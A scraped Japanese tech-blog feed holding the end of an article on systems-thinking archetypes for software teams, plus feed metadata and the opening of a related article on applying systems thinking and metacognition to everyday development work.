共有地の悲劇—個人合理性と集団非合理性個人合理性と集団非合理性の対立このアーキタイプは、複数の主体が共有資源を利用するシステムで、各個人にとって合理的な行動が、集団全体には非合理的な結果を生む構造です。構造:個人Aの資源利用 →(+) Aの利益 →(+) さらなる資源利用      ↑                                │      │                                │      └────────────────────────────────┘  R1:Aの利益最大化      個人Bの資源利用 →(+) Bの利益 →(+) さらなる資源利用      ↑                                │      │                                │      └────────────────────────────────┘  R2:Bの利益最大化      全員の利用の合計 →(+) 共有資源の枯渇 →(−) 全員の利益自分の時間とエネルギーという共有資源を考えてみましょう。仕事、家族、趣味、健康—すべてが「もっと時間を」と要求します。各領域の要求は個別には合理的です。しかし結果として、睡眠や休息が犠牲になり、燃え尽き症候群に陥ることがあります。コードベースという共有地も同様です。「納期があるから、とりあえず動くコードを書く」という各開発者の判断は、個別には合理的です。しかし結果として、コードが理解困難になり、全員の開発速度が低下していきます。「共有地の悲劇」は、私有財産制を正当化するために使われてきた概念ではないでしょうか。「共有資源は必ず枯渇する」という前提は、エリノア・オストロムの研究によって反証されています。実際、多くのコミュニティは何世代にもわたって共有資源を持続的に管理してきました。このアーキタイプは、人間の利己性を前提とし、協力や相互扶助の可能性を無視しているのではないか。確かに、オストロムの研究は、ルールとガバナンスがあれば共有資源は持続可能に管理できることを示しました。「共有地の悲劇」は必然ではなく、制度設計の失敗なのです。このアーキタイプの価値は、まさにその点にある。制度なしには共有資源は枯渇しやすいという警告なんだ。オストロムが示した持続可能な共有資源管理には、明確なルール、監視メカニズム、制裁システム、紛争解決手段が必要でした。つまり、意図的な設計と管理が不可欠なのです。このアーキタイプは「共有はダメだ」と言っているのではなく、「共有資源には意図的な管理が必要だ」と教えているのです。どう介入すればよいか。まず、資源の可視化が重要です。残量を表示し、「自分一人くらい」という錯覚を防ぎます。次に、利用ルールを設定します。各主体の利用に明示的な制限を設けるのです。フィードバックの直接化も効果的です。過剰利用の影響を、利用者に直接返します。そして、共同管理の仕組みを導入します。資源を共同で管理する仕組みを作り、「誰かがやるだろう」という心理を防ぐのです。このアーキタイプが示すシステム的洞察は重要です。個人の合理的行動の集積が、集団的には非合理的な結果を生むのです。個人システムの最適化だけでなく、大きなシステムの持続可能性を考慮することが、真に賢明な個人の行動なのです。目標管理の失敗—期待と現実のギャップ次の2つのアーキタイプは、目標設定と達成のプロセスで起こる典型的な罠です。9. バラバラの目標—対立する複数の目標複数の目標が互いを妨げる構造このアーキタイプは、複数の対立する目標を同時に追求しようとして、結局どれも達成できなくなるパターンです。構造:目標Aと現状のギャップ →(+) Aへの努力 →(+) Aの達成                                ↓                              (−)                                ↓目標Bと現状のギャップ ←────────┘      ↓     (+)      ↓   Bへの努力 →(+) Bの達成      ↓    (−)      ↓  目標Aの達成 ←────┘    B1:目標Aの追求  B2:目標Bの追求  互いに妨害し合うスピードと品質の両立を考えてみましょう。「素早くリリースする」という目標と「高品質を維持する」という目標があります。スピードを追求すると品質が下がり、品質を追求するとスピードが下がります。結果として、中途半端なスピードと中途半端な品質になってしまうのです。技術的負債の返済と新機能開発の両立も同様です。負債返済にリソースを使うと新機能が遅れ、新機能を優先すると負債が増えます。どちらも中途半端になります。「バラバラの目標」という表現は、ネガティブすぎないでしょうか。複数の目標を持つことは、組織の成熟の証ではないのか。スピードと品質、短期と長期、個人と組織—これらのバランスを取ることこそがマネジメントの本質ではないのか。このアーキタイプは、単一目標への集中を暗に推奨しているように見えますが、それは視野狭窄を招くのではないか。確かに、複雑な組織には複数の正当な目標が必要です。問題は複数の目標を持つこと自体ではなく、それらの間のトレードオフを認識せずに「すべて同時に最大化」しようとすることにあります。重要な洞察は、目標間の相互作用を理解することです。スピードと品質は必ずしも対立しません。自動化によって両立できることもあります。しかし、限られたリソースの中では、どこかで優先順位をつけざるを得ません。このアーキタイプが警告しているのは、トレードオフを認識せず、すべての目標を同時に最大化しようとする非現実的な期待です。成熟した組織は、複数の目標を持ちつつ、それらの動的なバランスを取ります。どう介入すればよいか。まず、優先順位を明確にすることです。すべてを同時に追求するのではなく、時期によって優先順位を変えるのです。次に、トレードオフを理解します。「すべてを同時に最大化」は不可能です。何を諦めるかを明確にします。目標の統合を探すことも重要です。対立を前提とせず、両方を満たす第三の道を探ります。例えば、「自動化による品質とスピードの両立」という統合的アプローチがあるかもしれません。そして、より上位の目標に立ち返ります。「なぜこれらの目標が必要なのか?」を問い、本質的な目標を再定義するのです。このアーキタイプが示す重要な洞察は、「すべてが重要」という考え方の罠です。何もかも追求しようとすると、結局何も達成できないのです。10. 目標のなし崩し—徐々に下がる基準目標が現状に引きずられて下がる構造このアーキタイプは、目標と現状のギャップに対して、現状を改善するのではなく、目標を下げることで対処してしまうパターンです。別名「ずり落ちる目標」「ゆでガエル症候群」とも呼ばれます。構造:パフォーマンスの目標 →(+) ギャップ認識 →(+) 改善努力         ↑                                    ↓         │                                   (+)      (遅延)                                  ↓         │                              実際のパフォーマンス         │                                    │         └←(+) プレッシャー ←(+) ギャップ ←(−)┘              ↓            (−)              ↓      目標の引き下げ (短期的な解決)            B1:改善努力のループ(正しい)      B2:目標引き下げのループ(安易な逃避)コードカバレッジの目標を考えてみましょう。当初は「テストカバレッジ80%を維持」という目標がありました。しかし忙しくて達成困難になると、「まあ、60%でいいか」と下げてしまいます。さらに「50%でも動いているし」となり、品質基準が徐々に劣化していくのです。リリースサイクルも同様です。当初は「2週間ごとにリリース」という目標がありました。しかし間に合わないと「3週間にしよう」と延ばし、さらに「1ヶ月でいいか」となります。開発速度が徐々に低下していきます。目標を柔軟に調整することは、適応力の表れではないでしょうか。80%のカバレッジが本当に必要かどうかは、プロジェクトの性質によります。盲目的に高い目標を維持することは、むしろ硬直性を生むのではないか。「目標のなし崩し」と「現実的な目標調整」の境界はどこにあるのか。このアーキタイプは、柔軟性を欠いた完璧主義を推奨しているように見えます。確かに、状況に応じて目標を調整することは必要です。問題は、調整が意図的か、それとも無意識の逃避かにあります。重要な区別があります。戦略的な目標調整は、新しい情報に基づいて意識的に行われます。「80%のカバレッジは過剰だと判明した。根拠を持って60%に調整する」これは健全です。一方、なし崩しは、達成困難さから逃れるために無意識に行われます。「忙しいから、とりあえず下げよう」これが問題なのです。このアーキタイプの本質は、基準を下げることの危険性ではなく、下げていることに気づかない危険性にあります。ゆでガエルの比喩が示すように、徐々の変化は認識されにくいのです。どう介入すればよいか。まず、絶対的な基準を設定することです。「競合他社より速い」という相対基準ではなく、「ユーザーが快適と感じる500ms」という絶対基準を持つのです。次に、外部ベンチマークとの比較を続けます。内部基準だけでなく、業界標準や競合と比較し続けます。ビジョンへの回帰も重要です。「なぜこの目標を設定したのか」という初心に立ち返るのです。目標の引き下げを可視化することも効果的です。変更履歴を記録し、「ずり落ち」を認識可能にします。そして、外部からの監視を入れます。外部の目(顧客、経営陣、第三者)を入れ、内部だけの判断を避けるのです。このアーキタイプは「ゆでガエル」の比喩で知られます。徐々に悪化する環境には気づきにくく、気づいたときには手遅れになっている。定期的な振り返りと、絶対的な基準の維持が重要なのです。競争のダイナミクス—エスカレートの構造11. エスカレート—報復の応酬互いの脅威認識が増幅する構造このアーキタイプは、互いに脅威と感じる行動を取り合い、報復がエスカレートしていくパターンです。軍拡競争、価格競争、誹謗中傷合戦などに見られます。構造:Aの相対的優位性 →(+) Aの脅威認識 →(+) Aの対抗行動      ↓                                    ↓    (−)                                  (−)      ↓                                    ↓Bの相対的優位性 ←────────────────────────┘      │     (+)      ↓Bの脅威認識 →(+) Bの対抗行動      │                ↓      └──────←(−)──────┘            B1:Aの防衛ループ      B2:Bの防衛ループ      R3:エスカレートの悪循環2つのチームの対立を考えてみましょう。チームAが「自分たちが主導権を持つべき」と主張すると、チームBが「自分たちの方が重要」と反論します。Aがさらに強く主張すると、Bがさらに反発します。組織が分断され、協力が不可能になり、プロジェクト全体が停滞していきます。技術選定の対立はさらに感情的になることがあります。エンジニアAが「React を使うべき」と主張すると、エンジニアBが「Vueの方が良い」と反論します。それぞれが相手の技術の欠点を指摘し合い、やがて人格攻撃に発展します。チームの雰囲気が悪化し、建設的な議論が不可能になるのです。ただ、競争は必ずしも悪じゃない。市場経済は競争によって効率化を達成してきた。技術選定での議論も、より良い選択につながることがあります。「エスカレート」を常に悪とする見方は、健全な競争や建設的な議論まで抑圧してしまうのではないか。いつ競争が「エスカレート」になるのか、その境界は曖昧ではないか。確かに、健全な競争と破壊的なエスカレートは異なります。問題は、競争そのものではなく、ゼロサム思考への転換です。健全な競争では、両者が切磋琢磨し、全体のレベルが上がります。一方、エスカレートでは、相手を打ち負かすこと自体が目的化し、全体が消耗します。技術選定での建設的な議論は、「どちらがこのプロジェクトに適しているか」を探ります。一方、エスカレートした対立では、「どちらが正しいか」を証明することが目的になります。境界は確かに曖昧ですが、重要な指標があります。相手の意見を聞く余裕があるか、共通の目標を見失っていないか、個人攻撃に発展していないか。これらが、健全な競争とエスカレートを分ける基準です。どう介入すればよいか。最も効果的なのは、どちらかが先に「攻撃的な行動」を止めることです。勇気が必要ですが、一方的な停戦が最も効果的です。共通の敵を作ることも効果的です。対立の構図を変え、「A対B」から「AとB対共通の課題」に転換するのです。競争ゲームを協力ゲームに変えることも重要です。ゼロサムではなく、両方が勝てる構造を設計します。第三者の介入も有効です。中立的な立場の人が仲介し、感情的なエスカレートを止めます。そして、より上位の目標を共有します。「どちらが正しいか」ではなく「ユーザーにとって何が最善か」という視点に立つのです。このアーキタイプが示す重要な洞察は、エスカレートが両者の「防衛」という認識から始まるということです。「相手が攻撃してきたから防衛する」という論理が、相手にとっては「攻撃」に見える。この非対称な認識がエスカレートを生むのです。長期的成長の失敗—投資不足の罠12. 成長と投資不足—自らが生み出す限界成長機会を投資不足で失う構造このアーキタイプは、成長に必要な投資(キャパシティへの投資)を怠り、パフォーマンスが低下し、需要が減少し、投資の必要性すら失われるという悪循環のパターンです。構造:需要 →(+) 成長の圧力 →(+) パフォーマンス改善  ↑                              ↓  │                             (+)  └←(+)─────────────────────キャパシティ                                  ↑                                (−)遅延                                  │                          投資 ←(−) パフォーマンス基準との不一致                                                    B1:成長のループ                          B2:投資のループ                          R3:投資不足の悪循環重要な構造的特徴を理解しましょう。成長が限界に近づくと、パフォーマンスが低下します。低下したパフォーマンスを見て「もう成長は終わった」と誤判断し、投資を控えます。投資不足により、さらにパフォーマンスが低下し、需要が減ります。「成長しない」と信じたことで、本当に成長しなくなる自己成就的予言が起きるのです。技術的負債の返済を考えてみましょう。ユーザーが増え、機能要求が増えるという成長があります。しかし技術的負債により開発速度が低下します。「新機能を優先すべき」と投資(リファクタリング)を後回しにすると、さらに開発速度が低下し、需要に応えられず、ユーザーが離れていきます。「どうせユーザーは減っている」と投資しなくなる悪循環に入るのです。インフラの増強も同様です。トラフィックが増加するという成長があります。しかしサーバーが限界に近づき、レスポンスが遅延します。「一時的な現象」と判断してインフラ投資を控えると、さらに遅延が悪化し、ユーザー体験が悪化し、ユーザーが離れていきます。「どうせユーザーは減っている」と投資しなくなるのです。もちろん、すべての低下が「投資不足」で説明できるわけじゃない。時には、製品が本当に市場のニーズを失っていることもある。衰退しているビジネスに投資を続けることは、「サンクコストの誤謬」ではないのか。このアーキタイプは、投資すれば必ず成長するという楽観主義に基づいていないか。撤退の判断を遅らせ、資源の浪費を正当化するために使われる危険性はないか。確かに、すべての衰退が投資不足によるものではありません。市場そのものが縮小していることもあれば、製品が時代遅れになっていることもあります。そして、撤退すべきタイミングを見極めることは、投資を続けることと同じくらい重要です。このアーキタイプが警告しているのは、投資不足による自己成就的予言だ。重要な区別は、外部要因による衰退か、内部の投資不足による衰退かを見極めることです。判断の基準があります。市場全体は成長しているか、競合は成長しているか、パフォーマンス低下の原因は何か。これらを分析することで、投資すべきか撤退すべきかを判断できます。このアーキタイプの真の価値は、早すぎる諦めを防ぐことにあります。一時的なパフォーマンス低下を見て「もうダメだ」と判断する前に、投資によって回復可能かを検討する。この視点が、本来救えたはずのシステムを救うのです。どう介入すればよいか。まず、将来を見据えた投資を行います。現在のパフォーマンスではなく、将来の需要を基準に投資を判断するのです。次に、先行指標を設定します。「ユーザー数」だけでなく「潜在的需要」「市場機会」を見ます。投資を可視化することも重要です。技術的負債、インフラ、人材育成への投資を、明示的に予算化します。長期的視点を制度化します。四半期だけでなく、3年後、5年後のビジョンで判断します。そして、成長への信念を維持します。一時的な低下に過剰反応せず、長期的な成長ストーリーを信じるのです。ただし、これは盲目的な楽観ではなく、データに基づいた信念である必要があります。「成長の限界」との違いに注意してください。「成長の限界」は外部の物理的制約により成長が止まるパターンです。一方、「成長と投資不足」は投資判断の失敗により、自ら成長を止めてしまうパターンなのです。このアーキタイプが示す重要な洞察は、自己成就的予言の危険性です。「成長しない」と信じて投資を控えると、本当に成長しなくなる。逆に、合理的な投資を続ければ、成長は再開できるのです。アーキタイプを見抜く技術これらのアーキタイプは、単独で現れることは稀です。実際のシステムでは、複数のアーキタイプが組み合わさっています。アーキタイプを見抜くには、プロセスがあります。まず、繰り返しのパターンに気づくことです。「またこの問題か」という違和感を大切にし、時系列でパターンを観察します。次に、氷山モデルで掘り下げます。出来事の背後にある構造を探り、パターンから構造へ、構造からメンタルモデルへと深掘りしていきます。そして、フィードバックループを描きます。因果関係を図示し、ループを特定します。強化ループ(R)とバランスループ(B)を識別するのです。既知のアーキタイプと照合します。「これは○○のパターンに似ている」と気づくことが重要です。完全一致を求める必要はありません。類似性を見るのです。最後に、効果的な介入ポイントを見つけます。アーキタイプの知見を活用し、レバレッジポイントを特定します。小さな変更で大きな影響を与えられる場所を探すのです。生成AIへの過度な依存を例に考えてみましょう。これは実は複数のアーキタイプの組み合わせです。思考プロセス(根本対処)をAI(症状対処)に置き換えるという「問題の転嫁」があります。AI使用という強化ループが思考力という制約にぶつかる「成長の限界」があります。AIを使える人とそうでない人の差が開くという「強者はますます強く」があります。そして、短期的な生産性向上が長期的な能力低下を生むという「うまくいかない解決策」もあります。このように、現実の問題は複雑です。しかし、個々のアーキタイプを理解していれば、複雑な問題も、既知のパターンの組み合わせとして理解できるようになるのです。おわりにシステムアーキタイプは、繰り返し現れる問題の構造パターンです。熟練したアーキテクトがシステム設計を見ただけでボトルネックを予測できるように、アーキタイプを理解すれば、問題の本質を素早く見抜けます。12のアーキタイプを振り返りましょう。好循環と悪循環は、変化の自己強化を示し、初期条件が未来を決めることを教えてくれます。バランス型プロセスと遅延は、調整の失敗を示し、時間遅延が過剰反応を生むことを教えてくれます。うまくいかない解決策は、短期的成功の罠を示し、副作用が問題を悪化させることを教えてくれます。問題のすり替わりは、根本解決の機会損失を示し、症状対処が根本対処を妨げることを教えてくれます。成長の限界は、自らを制限する構造を示し、制約の特定と緩和が鍵であることを教えてくれます。強者はますます強くは、資源配分の不均衡を示し、勝者総取りの構造を教えてくれます。予期せぬ敵対関係は、協力者が敵になる罠を示し、善意から生まれる悲劇を教えてくれます。共有地の悲劇は、個人合理性と集団非合理性の対立を示し、持続可能性の喪失を教えてくれます。バラバラの目標は、対立する複数の目標を示し、すべてを追うと何も得られないことを教えてくれます。目標のなし崩しは、徐々に下がる基準を示し、ゆでガエル症候群を教えてくれます。エスカレートは、報復の応酬を示し、防衛のつもりが攻撃に見えることを教えてくれます。成長と投資不足は、自らが生み出す限界を示し、自己成就的予言の危険性を教えてくれます。生成AI時代との関連を考えてみましょう。生成AIの普及は、新しい「問題の転嫁」「うまくいかない解決策」「成長の限界」のパターンを生み出しています。序章で述べた非対称性—生産と理解の乖離、生産量と成長の乖離、経験の量と学びの質の乖離—は、これらのアーキタイプとして現れています。アーキタイプの認識は、この構造的問題を見抜く力を与えてくれるのです。実践への第一歩は簡単です。繰り返される問題に直面したら、立ち止まって考えてみてください。「このパターン、どこかで見たな」と。そして、この記事で学んだアーキタイプの中に、似たものがないか探してみてください。完璧に当てはまらなくても構いません。構造を意識するだけで、見え方が変わります。システムアーキタイプは、先人たちの知恵の結晶です。同じ過ちを繰り返さず、効果的に問題を解決するための地図です。この地図を手に、複雑なシステムの世界を旅していきましょう。","isoDate":"2025-10-05T22:42:20.000Z","dateMiliSeconds":1759704140000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Spec DrivenでAI駆動開発を加速させる - Spec Kit入門","link":"https://zenn.dev/r4ynode/articles/spec-driven-development-using-spec-kit","contentSnippet":"はじめにAIに対して工夫なしの指示だと開発に限界を感じることもあるでしょう。AIにしっかりとコンテキストを渡してあげないと、意図通りに動いてくれません。考えられる解決策としては、自前でコンテキストや指示を書いたインストラクションMarkdownファイルを与える方法があります。個人的にはインストラクションの方が手軽なのでよくやりますが、先日以下の記事でSpec Drivenという言葉を見かけました。https://github.blog/ai-and-ml/generative-ai/spec-driven-development-with-ai-get-started-with...","isoDate":"2025-10-03T23:00:05.000Z","dateMiliSeconds":1759532405000,"authorName":"Reito Koike","authorId":"reito"},{"title":"DevOps/MLOpsに学ぶエージェントの可観測性","link":"https://speakerdeck.com/yunosukey/mlopsnixue-buezientonoke-guan-ce-xing","contentSnippet":"","isoDate":"2025-10-03T04:00:00.000Z","dateMiliSeconds":1759464000000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"システム思考を日々の開発に取り入れる実践ガイド","link":"https://syu-m-5151.hatenablog.com/entry/2025/10/01/203924","contentSnippet":"syu-m-5151.hatenablog.comはじめに前回の記事では、システム思考の基本的な概念—非線形性、関係性、反直感性、氷山モデル—を見てきました。システムをプラモデルではなく生態系として理解する視点を学びました。しかし、概念を知っているだけでは意味がありません。テニスの本を読んでもテニスができるようにならないように、システム思考も実践してこそ身につくものです。理論を学んだ今、次のステップは「どう実践するか」です。この記事では、日々の開発の中でシステム思考をどう使うかを具体的に解説します。取り上げるのは、自己認識の深め方、建設的な対話の作り方、フィードバックループの設計、パターンの見つけ方、そしてモデリングの実践です。これらはシステム思考の実践方法のほんの一部ですが、すべて明日から使える方法ばかりです。特別なツールや権限は必要ありません。新人エンジニアでも、今日から、今いるチームで始められます。大切なのは、小さく始めることです。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。自己認識とメタ認知思考を改善するには、まず自分の思考に気づく必要があります。メタ思考～「頭のいい人」の思考法を身につける作者:澤円大和書房Amazon「なぜ私はこの解決策を選んだのか？」「どんな前提に基づいて判断しているのか？」「他の視点から見たらどうなるだろう？」システム思考の最良の開始方法は、最も身近なシステムである自分自身で練習することです。自分がどのように考え、決定し、行動しているかを観察することから始まります。これをメタ認知—自分の思考を客観的に見る力—と呼びます。ここで重要なのは、「問う」という行為の本質を理解することです。「問う」とは、実は「情報を編集する」という知的営みなのです。私たちは日々、膨大な情報に囲まれています。システムログ、エラーメッセージ、レビューコメント、仕様書、チャットの会話—これら無数の断片的な情報を、どう組み合わせ、どう意味づけるか。それが「問い」を立てるということです。問いの編集力 思考の「はじまり」を探究する作者:安藤昭子ディスカヴァー・トゥエンティワンAmazon「このバグはなぜ起きたのか」という問いは、エラーメッセージ、コードの履歴、環境設定、ユーザーの操作ログといった複数の情報を編集し、一つの物語として組み立てる作業です。「この設計で本当にいいのか」という問いは、要件、制約、技術的選択肢、チームの状況といった情報を再構成する試みです。そして、一人ひとりの編集力によって、その人ならではの内発する「問い」が生まれます。新人エンジニアのあなたが感じる違和感は、ベテランには見えない問いの種かもしれません。「なぜこの変数名はこんなに長いのだろう」「なぜこの処理は分散しているのだろう」—こうした素朴な疑問が、実はシステムの本質的な問題を指し示していることがある。問いが生まれるプロセスには、段階があります。まず「問い」の土壌をほぐす—これが自己認識です。自分がどんな前提で考えているか、どんな偏りを持っているか、どんな経験が判断に影響しているか。この土壌が固ければ、問いは芽を出せません。具体的にどう実践するか。何か技術を選ぶとき（フレームワーク、ライブラリ、設計パターン）、紙に書き出してみる。最初に思いついた選択肢は何か。なぜそれを思いついたのか—過去の経験？記事を読んだ？先輩に勧められた？他の選択肢は検討したか。最終的な判断の決め手は何だったか。ここで大切なのは、違和感に気づくことです。「なんとなくこの技術が良さそう」と思ったとき、その「なんとなく」の正体は何でしょうか。単に新しい技術を試したいだけではないか。本当にこのプロジェクトに適しているのか。この振り返りが、「問い」のタネを集めるプロセスです。自分の判断パターンや偏りに気づき、「本当にそうなのか？」という問いのタネが生まれる。次に、日々の仕事で何が重要で何がそうでないかを判断する練習をする。Slackの大量の通知、「緊急」と書かれているが実は緊急でないタスク、細かいコーディングスタイルの議論—これらはノイズかもしれない。一方で、ユーザーからの「使いにくい」という小さなフィードバック、システムログの中の見慣れないエラー、先輩の何気ない一言「このコード、後で問題になりそう」—これらがシグナル、つまり本当に重要な情報かもしれない。重要なのは、形式的なチェックリストに従うことではありません。自分の中に自然と湧き上がる問いに気づくことです。「このコード、なんか気持ち悪いな」という感覚。「この設計、本当にこれでいいのか？」という引っかかり。こうした違和感こそが、「問い」を発芽させるきっかけなのです。週末に5分だけ振り返りをしてみる。「今週、どれに時間を使ったか」「本当に重要だったのはどれか」。この練習で、重要なことを見抜く力が養われる。そして、新しい技術を学ぶとき、「これは難しすぎる」と思ったら、一歩引いて考えてみる。本当に難しいのか、それとも単に馴染みがないだけか。どの部分が理解できて、どの部分が理解できないか。理解できない理由は何か—前提知識の不足？説明が分かりにくい？この分析によって、「難しい」という漠然とした感覚が、「この部分の前提知識が足りない」という具体的な課題に変わる。これが「問い」が結像する瞬間です。このプロセス全体—土壌をほぐし、タネを集め、発芽させ、結像させる—が、「問いの編集力」です。これは「問う」という知的営みを、一人ひとりの編集力でアップデートするプロジェクトなのです。そして、この力こそが、システム全体をより良く理解し、設計する力につながります。ここで一つ、現代のエンジニアが直面する重要な課題について触れておきたい。生成AIは、確かに開発効率を飛躍的に高めてくれる。しかし、過度な利便性は、個人の成長に不可欠な「考える過程」を奪ってしまう危険性がある。「この関数、どう実装すればいいだろう？」という問いに直面したとき、すぐにAIに答えを求めるのは簡単だ。人は本質的に快適さを求め、最も抵抗の少ない道を選んでしまう。しかし、その「なぜこのアプローチを選ぶのか」「他にどんな選択肢があるのか」と自分で考える過程こそが、問いの編集力を育てる土壌なのだ。だからといって、AIを完全に排除すべきだという話ではない。重要なのは、将来の自分を妨げないよう、意図的に活用することだ。例えば、まず自分で5分考えてから、AIに相談する。AIの提案を受け取ったら、「なぜこのコードがそう書かれているのか」を理解しようとする。あるいは、実装の方向性を確認する用途には使うが、細部の実装は自分で書いてみる。こうした意図的な距離感が、創造性と成長を維持する鍵となる。システム思考を身につけるには、この「立ち止まって考える時間」が不可欠だ。便利なツールを使いながらも、自分で問いを立て、自分で考える習慣を意識的に守っていこう。自己認識を高めることは、単に自分を知ることではありません。自分ならではの問いを生み出せるようになることです。そして、その問いがシステムの本質に迫るとき、あなたは本当の意味でのシステム思考の実践者になっているのです。反応から応答へ誰かがアイデアを提案しました。あなたの最初の反応は「でも、それは...」かもしれません。ちょっと待ってください。他者と働く──「わかりあえなさ」から始める組織論 (NewsPicksパブリッシング)作者:宇田川元一ニューズピックスAmazonシステム思考は、出来事への反応から、応答的な行動パターンへ、そして（改善された）システム構造の生成へと移行する能力です。そして、その第一歩が「まず受け止める」という姿勢です。開発現場では、しばしば「否定から入る」文化が見られます。新しい提案に対して、即座に「でも」「しかし」「それは無理だ」と反応してしまう。これは慎重さの表れかもしれませんが、建設的な対話を阻害してしまいます。まず受け止めるとは、相手のアイデアを即座に否定せず、その意図や背景を理解しようとすることです。これは合意することではありません。相手の視点を理解することと、それに同意することは別の話です。例えば、同僚が「このシステムをマイクロサービスに分割すべきだ」と提案したとします。否定的な反応は「でも、そんなことしたら複雑になるだけですよ」となるかもしれません。しかし、まず受け止めるアプローチでは「なるほど、マイクロサービス化することで独立したデプロイが可能になりますね。それを実現するには、サービス間の境界をどう定義するか考える必要がありそうです。現状の課題も含めて、一緒に検討してみませんか」といった形で応答します。この姿勢は、対立ではなく対話を生み出します。「私の考えを変えて」と要求するのではなく、「一緒に考えよう」という協働の場を作るのです。これこそが、システム思考に必要な姿勢なのです。まず受け止めることで、異なる視点を統合し、より豊かな解決策を生み出すための土台が作られます。相手のアイデアを否定するのではなく、それを出発点として、共に探求を深めていくのです。これは簡単なことではありません。特に、明らかに問題があると感じるアイデアに対して、まず受け止めるのは困難です。しかし、相手の視点を理解し、その上で建設的な方向に導くことで、より良い結果を生み出せるのです。「なぜそう考えたのか」を聞くことから始めましょう。その背景を理解すれば、本当の課題が見えてくることもあります。本当のゴールを見つける目標を抽象化して本質を見極めることから始めます。例えば「レガシーシステムをモダン化する」という目標の本質は何でしょうか？表面的には「古い技術を新しい技術に置き換える」と見えます。しかし、システム思考で考えると、本当の目的は「変更コストを下げ、新機能を素早く提供できる状態を作る」ことかもしれません。あるいは「属人化を解消し、チーム全体がシステムを理解できる状態を作る」ことかもしれません。この理想的な状態の定義が曖昧だと、どれだけ細かく分解しても、正しい方向に進めません。氷山モデルで言えば、最も深い層である「メンタルモデル」を明確にすることです。具体的には、次のような問いを立てます。「なぜこの目標が必要なのか？」という問いは、目標の背景にある本当の課題を浮き彫りにします。「達成したら、何が変わるのか？」という問いは、成功の姿を具体的にします。「誰にとっての価値を生み出すのか？」という問いは、ステークホルダーとその期待を明確にします。そして「この目標の成功は、どう測定できるのか？」という問いは、抽象的な理想を検証可能な基準に変換します。この問いに答えることで、漠然とした目標が、明確な理想状態に変わります。そして、この明確な理想状態こそが、すべての具体的な行動の羅針盤となるのです。具体と抽象作者:細谷 功dZERO（インプレス）Amazonシステム的推論知識労働者として、私たちは常に、形式的または非形式的に、アイデア、行動、理論を提案しています。「このアーキテクチャを採用すべきだ」「このツールを使うべきだ」「この方法で実装すべきだ」しかし、その提案に説得力を持たせるには、システム的推論が必要です。新人エンジニアのあなたも、日々の開発で「なぜこの方法を選んだのか」を説明する場面があるでしょう。例えば、納期が迫る中で「テストコードを書く時間がない」という意見に対して、どう考えますか？ここでシステム的推論が力を発揮します。単に「テストは重要だから書くべき」という原則論ではなく、システム全体への影響を考える。「確かに今週の納期は重要です。しかし、テストなしでリリースすると、本番環境でバグが発生する可能性が高まります。過去3ヶ月のデータを見ると、テストカバレッジが50%未満のコンポーネントは、平均して月2回の緊急修正が必要でした。各修正には平均4時間かかり、さらに顧客への説明や再リリースの手間も考えると、今2時間かけてテストを書く方が、トータルの工数は削減できます」このような推論には、信頼性（過去のデータに基づく）、関連性（現在の状況に直結）、結束性（理由が相互に補強し合う）、説得力（具体的な数値で示す）という要素が含まれています。重要なのは、メリット・デメリットを機械的に並べることではありません。システム全体の中で、この選択がどんな波及効果を生むかを考えることです。短期的なメリットが長期的なデメリットを生むかもしれない。一つの部分の最適化が、別の部分のボトルネックを作るかもしれない。こうした相互作用を含めて考えることが、システム的推論なのです。日本の開発現場でよくある「仕様変更」への対応も、システム的推論で考えると違って見えます。「また仕様変更か...」と嘆くのではなく、「この仕様変更のパターンから、顧客が本当に求めているものが見えてきた。次回から、初期段階でプロトタイプを見せて早めにフィードバックをもらう仕組みを提案してみよう」という建設的な提案につなげられるのです。なぜあの人の解決策はいつもうまくいくのか?―小さな力で大きく動かす!システム思考の上手な使い方作者:枝廣 淳子,小田 理一郎東洋経済新報社Amazon目標を構造化する技術理想的な状態が定義できたら、そこに至る道筋を設計します。ここで重要なのが、4つの視点で構造化するという考え方です。1. 時間を構造化する時間は最も重要な制約です。そして、制約こそが価値を生み出します。現実を直視しましょう。無限に時間があれば、そこそこ良いものは作れます。しかし、それでは意味がありません。永遠にリファクタリングを続け、完璧な設計を追求し、すべてのエッジケースに対応する—そんな仕事に価値はないのです。締め切りがあるからこそ、私たちは本質に集中します。何が本当に重要で、何が単なる理想なのかを見極めます。締め切り駆動こそが、本当の仕事なのです。だからこそ、締め切りを味方にする技術が必要です。3ヶ月後という最終締め切りがあるなら、3ヶ月先まで何もしないのではなく、中間地点を意図的に設計します。重要なのは、単に時間を等分するのではなく、意味のあるマイルストーンを設定することです。「1週間後にプロトタイプで検証」「2週間後にチームでレビュー」「1ヶ月後に本実装開始」というように、各地点で何を達成し、何を学ぶのかを明確にします。各マイルストーンが小さな締め切りとなり、あなたを前進させます。そして、日にちではなく日時で決めることです。「来週中」ではなく「水曜日の15時まで」。さらに、他者と約束することで強制力を持たせます。「水曜のミーティングで進捗を共有します」と宣言することで、逃げ場のないコミットメントが生まれます。この適度なプレッシャーが、フィードバックループを回し続けるのです。2. 複雑さを分割する大きな問題を前にしたとき、全体を一度に理解しようとするのは無謀です。それは不可能であるだけでなく、非効率でもあります。現実の開発では、完全な理解を待っている余裕はありません。不完全な理解のまま前に進み、動きながら理解を深めていく。これが実践です。しかし、闇雲に進むわけではありません。今この瞬間に何に集中すべきかを明確にする必要があります。ここで重要なのは、複雑さには構造があるということです。どんな複雑な問題も、認識のプロセスという観点から段階に分解できます。認識の段階で分割するシステムアーキテクチャの設計という大きなタスクを考えます。これは、認識の深さによって段階に分解できます。最初の段階は「理解する」こと。既存のシステムがどう動いているかを把握します。次の段階は「分析する」こと。何が問題で、何が改善の機会なのかを特定します。その次は「探索する」こと。複数の解決策を考え、比較します。さらに進んで「決定する」こと。最適な方向性を選択します。最後に「実装する」こと。具体的な設計を作り上げます。この段階分けの本質は、各段階で問う質問が異なるということです。理解の段階では「これは何をしているのか？」と問います。分析の段階では「何が問題なのか？」と問います。探索の段階では「他にどんな方法があるか？」と問います。決定の段階では「どれを選ぶべきか？」と問います。実装の段階では「どう作るか？」と問います。これらの質問を同時に考えようとすると、頭が混乱します。「これは何をしているのか」を理解する前に「どう作るか」を考え始めると、理解が浅いまま実装に進んでしまいます。だから、今はどの質問に答えるべきかを明確にするのです。認知的な負荷で分割する各段階の中でも、さらに認知的な負荷を下げる工夫が必要です。「既存システムを理解する」という段階を考えます。これをいきなり「理解しよう」とすると、脳が過負荷になります。だから、行動を段階的に組み立てます。